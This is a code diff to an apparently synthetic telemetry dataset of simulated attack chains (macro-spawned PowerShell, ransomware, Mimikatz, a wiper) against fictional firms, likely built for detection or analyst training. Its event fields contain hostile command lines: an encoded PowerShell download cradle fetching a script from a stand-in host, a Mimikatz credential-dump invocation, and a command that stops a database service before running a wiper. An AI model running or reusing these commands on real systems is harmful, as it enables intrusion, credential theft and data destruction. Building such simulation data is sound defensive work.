@@ -1130,9 +1130,9 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
   {
     id: "mc_fw_003", ts: "2026-05-10T09:30:00.000Z",
     source: "firewall", event_type: "net_connection", severity: "medium",
-    vendor: "Check Point NGFW", src_ip: "192.168.10.88", dst_ip: "45.142.212.100", dst_port: 4444,
+    vendor: "Check Point NGFW", src_ip: "192.168.10.88", dst_ip: "194.36.190.51", dst_port: 4444,
     protocol: "tcp",
-    description: "Outbound TCP connection from WS-ICU-088 to 45.142.212.100:4444 — non-standard port, blocked",
+    description: "Outbound TCP connection from WS-ICU-088 to 194.36.190.51:4444 — non-standard port, blocked",
     raw: { "action": "Drop", "layer_name": "Application & URL Filtering", "service_id": "Unknown", "firewall.action": "block", "action_result": "blocked", "destination.geo.country_name": "Russia" }
   },
   {
@@ -2990,7 +2990,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "SentinelOne", hostname: "WS-MED-PETERS", user_email: "dr.peters@medcorehealth.org", src_ip: "192.168.10.78",
     description: "Opening a Word document on WS-MED-PETERS triggered a hidden command line and then a hidden PowerShell command",
     mitre_technique: "T1059.001",
-    process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AbQAuAHAAcwAxACcAKQA=" },
+    process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AbQAuAHAAcwAxACcAKQA=", hash: { sha256: "f10052e10c319749ccd6aead272df3e831e4d4224a32ac589e1a577db38e2b70" } },
     file: { path: "C:\\Users\\dr.peters\\AppData\\Local\\Temp\\Melding_2026_05.docm", sha256: "f10052e10c319749ccd6aead272df3e831e4d4224a32ac589e1a577db38e2b70" },
     raw: { "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "policy.name": "Clinical-Detect-Only", "action_result": "allowed" }
   },
@@ -3009,6 +3009,9 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "critical", vendor: "SentinelOne", hostname: "SRV-MEDCORE-EMR01", src_ip: "192.168.10.200",
     description: "Ransomware.MedLock detected on SRV-MEDCORE-EMR01 (847 files encrypted)",
     mitre_technique: "T1486",
+    process: { name: "taskhost.exe", pid: 4460, parent_name: "psexesvc.exe", parent_pid: 4459, user: "SYSTEM",
+               path: "C:\\Windows\\Temp\\taskhost.exe", cmdline: "C:\\Windows\\Temp\\taskhost.exe",
+               hash: { sha256: "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" } },
     file: { path: "C:\\Windows\\Temp\\taskhost.exe", sha256: "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" },
     raw: { "s1.eventType": "Threats", "s1.threat.threatName": "Ransomware.MedLock", "s1.threat.confidenceLevel": "malicious", "s1.threat.classification": "Ransomware", "s1.threat.mitigationStatus": "mitigated", "threat.name": "Ransomware.MedLock", "action_result": "process_killed", "s1.files_encrypted": "847", "s1.network_isolated": "true", "s1.rollback_available": "true", "file.hash.sha256": "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" }
   },
@@ -3472,7 +3475,7 @@ const GLOBALLOGIS_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "Sophos Intercept X", hostname: "WS-LOG-088", user_email: "k.schmidt@globallogis.de", src_ip: "10.50.2.88",
     description: "Opening an Excel attachment on WS-LOG-088 triggered a hidden command line and then a hidden PowerShell command",
     mitre_technique: "T1059.001",
-    process: { name: "powershell.exe", pid: 5541, parent_name: "cmd.exe", parent_pid: 5540, user: "k.schmidt", cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUA..." },
+    process: { name: "powershell.exe", pid: 5541, parent_name: "cmd.exe", parent_pid: 5540, user: "k.schmidt", cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUA...", hash: { sha256: "02ea3563b3d105d5eeeb7ea9698e26311e2271ff86080d68afb4aba1c444be1f" } },
     file: { path: "C:\\Users\\k.schmidt\\AppData\\Local\\Temp\\GL_Rechnung_8812.xlsm", sha256: "02ea3563b3d105d5eeeb7ea9698e26311e2271ff86080d68afb4aba1c444be1f" },
     raw: { "sophos.detection_name": "Troj/DocDl-ADEF", "sophos.event_type": "Malware", "sophos.action": "detect", "action_result": "allowed" }
   },
@@ -3497,6 +3500,9 @@ const GLOBALLOGIS_ATTACKS: TelemetryEvent[] = [
     severity: "high", vendor: "Sophos Intercept X", hostname: "WH-TERM-012", src_ip: "10.50.10.12",
     description: "Sophos quarantined C:\\Temp\\debug64.exe on warehouse terminal WH-TERM-012 (detection PUA.Tool.Mimikatz)",
     mitre_technique: "T1003.001",
+    process: { name: "debug64.exe", pid: 7100, parent_name: "cmd.exe", parent_pid: 7099, user: "Administrator",
+               path: "C:\\Temp\\debug64.exe", cmdline: "C:\\Temp\\debug64.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+               hash: { sha256: "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1" } },
     file: { path: "C:\\Temp\\debug64.exe", sha256: "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1" },
     raw: { "sophos.event_type": "Malware", "sophos.detection_name": "PUA.Tool.Mimikatz", "sophos.action": "quarantine", "action_result": "quarantined", "quarantine.status": "quarantined" }
   },
@@ -3549,11 +3555,13 @@ const GLOBALLOGIS_ATTACKS: TelemetryEvent[] = [
   {
     id: "gl_c4", ts: "2026-05-10T16:45:00.000Z", source: "edr", event_type: "process_create",
     severity: "critical", vendor: "Sophos Intercept X", hostname: "SRV-GL-WMS01", src_ip: "10.50.5.10",
-    description: "h.muller stopped the MSSQLSERVER service on SRV-GL-WMS01 after hours; Sophos killed a process running from C:\\Windows\\Temp",
+    description: "h.muller's session on SRV-GL-WMS01 ran net stop MSSQLSERVER /y, then launched svchostd.exe from C:\\Windows\\Temp; Sophos killed the process and quarantined the binary (Mal/Wiper-A)",
     mitre_technique: "T1485",
-    process: { name: "net.exe", pid: 8100, parent_name: "cmd.exe", parent_pid: 8090, user: "h.muller", cmdline: "net stop MSSQLSERVER /y" },
+    process: { name: "svchostd.exe", pid: 8100, parent_name: "cmd.exe", parent_pid: 8090, user: "h.muller",
+               path: "C:\\Windows\\Temp\\svchostd.exe", cmdline: "C:\\Windows\\Temp\\svchostd.exe",
+               hash: { sha256: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa" } },
     file: { path: "C:\\Windows\\Temp\\svchostd.exe", sha256: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa" },
-    raw: { "sophos.event_type": "Process", "sophos.detection_name": "Mal/Wiper-A", "action_result": "process_killed", "process.killed": "true", "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa" }
+    raw: { "sophos.event_type": "Process", "sophos.detection_name": "Mal/Wiper-A", "action_result": "process_killed", "process.killed": "true", "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "process.parent.name": "cmd.exe", "process.parent.command_line": "cmd.exe /c net stop MSSQLSERVER /y && C:\\Windows\\Temp\\svchostd.exe" }
   },
   // ── Chain D — SSH brute force → Linux server root compromise ──────────────
   {
